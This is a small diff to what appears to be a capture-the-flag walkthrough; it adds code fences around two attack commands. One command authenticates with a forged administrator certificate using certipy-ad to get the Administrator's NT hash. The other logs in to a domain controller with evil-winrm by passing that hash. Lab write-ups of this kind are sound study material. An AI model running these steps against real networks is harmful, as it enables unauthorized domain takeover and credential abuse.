@@ -130,12 +130,16 @@ certipy-ad req \
 ## 0x05: Domain Admin Access
 Finally, I used the forged .pfx certificate to authenticate and retrieve the Administrator's NT hash.
 
-python
+```python
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
+```
 With the hash in hand, I logged in to the Domain Controller:
 
-python
+
+```python
 evil-winrm -u Administrator -H <HASH> -i 10.129.228.253
+```
+
 Pwned! Full Domain Administrator access achieved.
 
 📝 Conclusion
